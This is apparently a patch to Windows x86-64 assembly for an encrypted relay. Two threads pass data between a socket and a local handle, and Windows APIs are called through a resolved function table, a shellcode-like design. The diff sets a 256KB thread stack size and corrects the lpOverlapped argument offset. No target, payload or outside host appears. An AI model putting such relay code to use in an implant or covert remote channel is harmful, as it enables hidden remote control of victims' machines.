@@ -28,9 +28,9 @@ relay_start:
     mov     [rel g_local_write], r8
 
     ; Create thread 1: socket -> local (decrypt direction)
-    ; CreateThread(NULL, 0, thread_sock_to_local, NULL, 0, NULL)
+    ; CreateThread(NULL, 262144, thread_sock_to_local, NULL, 0, NULL)
     xor     ecx, ecx                ; lpThreadAttributes = NULL
-    xor     edx, edx                ; dwStackSize = 0 (default)
+    mov     edx, 262144             ; dwStackSize = 256KB (for ~128KB buffers)
     lea     r8, [rel thread_sock_to_local]  ; lpStartAddress
     xor     r9d, r9d                ; lpParameter = NULL
     mov     qword [rsp + 32], 0     ; dwCreationFlags = 0
@@ -43,7 +43,7 @@ relay_start:
 
     ; Create thread 2: local -> socket (encrypt direction)
     xor     ecx, ecx
-    xor     edx, edx
+    mov     edx, 262144             ; dwStackSize = 256KB
     lea     r8, [rel thread_local_to_sock]
     xor     r9d, r9d
     mov     qword [rsp + 32], 0
@@ -155,7 +155,7 @@ thread_sock_to_local:
     lea     rdx, [rsp + S2L_PLAINBUF + 8]
     mov     r8d, r12d
     lea     r9, [rsp + S2L_WRITTEN + 8]
-    mov     qword [rsp + 32 + 8], 0     ; lpOverlapped = NULL
+    mov     qword [rsp + 32], 0         ; lpOverlapped = NULL
     call    [r15 + API_WriteFile * 8]
     test    eax, eax
     jz      .s2l_exit               ; WriteFile failed
@@ -210,7 +210,7 @@ thread_local_to_sock:
     lea     rdx, [rsp + L2S_PLAINBUF + 8]
     mov     r8d, BUF_SIZE
     lea     r9, [rsp + L2S_BYTESREAD + 8]
-    mov     qword [rsp + 32 + 8], 0     ; lpOverlapped = NULL
+    mov     qword [rsp + 32], 0         ; lpOverlapped = NULL
     call    [r15 + API_ReadFile * 8]
     test    eax, eax
     jz      .l2s_exit               ; ReadFile failed or EOF
